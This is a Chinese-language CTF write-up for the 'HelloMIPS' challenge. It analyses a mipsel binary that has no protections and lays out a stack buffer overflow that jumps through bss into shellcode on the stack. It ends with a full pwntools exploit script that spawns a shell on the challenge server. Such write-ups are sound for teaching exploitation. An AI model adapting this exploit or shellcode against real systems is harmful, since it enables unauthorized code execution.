## HelloMIPS

这题和arm的那题比较相似，也是ROP，但是比arm的简单一些，给的程序包含三个文件：



```
Archive:  ./HelloMIPS-833e170bbe2429fe66aae530c279c67b.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     7260  2020-10-03 14:52   HelloMIPS
        0  2020-10-04 22:27   lib/
   552634  2009-04-05 18:09   lib/libuClibc-0.9.30.1.so
    28971  2009-04-05 18:09   lib/ld-uClibc-0.9.30.1.so
---------                     -------
   588865                     4 files
```

checksec看一下：

![image-20201019142817343](image-20201019142817343.png)

是mipsel小端的程序，没有开任何的选项，那么这题很可能要在栈上执行代码了。

先用qemu跑一下程序：

```
qemu-mipsel -L ./ ./HelloMIPS
```

![image-20201019143112985](image-20201019143112985.png)

总的来说程序先要求一份输入，然后给出一个Magic number，之后会有一次输入，但是没有任何回显。

启动ida来分析这个程序：

程序和HelloARM的比较相似，但是main函数中没有buff，第一次读取的`0xF`个字节的内容被写入到bss段的`NAME`数组中。之后调用的`oooooo()`函数也存在缓冲区溢出，但是与ARM的汇编不同的是，存放返回地址的位置在缓冲区的上方，这使得我们可以直接劫持`oooooo()`的返回指令。

首先我们需要mipsel的函数调用规则，这里有一篇比较好的文章：https://blog.csdn.net/gujing001/article/details/8476685

简单来说，mipsel的函数调用，返回地址存放在`$ra`寄存器中。另外mipsel每次调用库函数时，会先从`.got`表中对应的项中取出目标函数地址，放入`$t9`寄存器然后用`jalr $9`跳入该目标函数。如果是第一次调用该函数，`.got`表中指向的会是该函数在`.plt`表中的对应代码，加载完成后会修改`.got`表项。



最后思路如下：

- 先劫持`oooooo()`的返回地址，跳转到bss段上，bss的地址是静态的，因此可以实现 。因此，我们要在第一次输入时，往bss上放置跳板代码。
- bss上的代码主要是读取栈指针`$sp`并跳转到栈上的地址执行代码
- 第二次输入时，需要在栈上填充代码，调用`system()`函数（它的地址就是给出的magic number的值），`/bin/sh`字符串可以放在栈上，但是要放在`$sp`指针的后面，否则在调用`system()`函数时会覆盖掉。

![image-20201019144642666](image-20201019144642666.png)



完整代码如下：

```python
from pwn import *
import sys
context.log_level = 'debug'
context.arch = 'mips'
Debug = True

elf = ELF('./HelloMIPS', checksec=False)


def get_sh(other_libc=null):
    # return process(["qemu-mipsel", "-L", "./", "./HelloMIPS"])
    return remote('10.104.255.211', 7777)
    global libc
    if args['REMOTE']:
        if other_libc is not null:
            libc = ELF("./", checksec=False)
        return remote('10.104.255.211', 7777)
    elif Debug:
        sh = process(["qemu-mipsel", "-g", "2333", "-L", "./", "./HelloMIPS"])
        log.info('Please use GDB remote!(Enter to continue)')
        raw_input()
        return sh
    else:
        return process(["qemu-mipsel", "-L", "./", "./HelloMIPS"])


conn = get_sh()
conn.recvline()

payload = b''
payload += asm('addi $t9, $sp, -0x108')
payload += asm('nop')
payload += asm('jalr $t9')
payload += b'\0' * (0xF-len(payload))


conn.send(payload)
conn.recvline()

bb = conn.recvline()

hex_magic = bb[15:-1].decode('utf-8')
addr_magic = int(hex_magic, 16)
print('hex_magic: {}'.format(hex_magic))

addr_NAME = 0x440E20
payload = b''
payload += asm('move $a0, $sp')
payload += asm('li $t9, ' + hex(addr_magic))
payload += asm('nop')
payload += asm('jalr $t9')
payload += asm('nop')


payload += b'a' * (0x100 - len(payload))
payload += p32(0xdeadbeef)
payload += p32(addr_NAME)
# 重要參數放到sp后面防止被冲掉！！！！！
payload += b'/bin/sh\0'

conn.send(payload)


conn.interactive()

# TSCTF{d561c9d2-064d-11eb-80ab-0242ac110002}
```



![image-20201019150313905](image-20201019150313905.png)













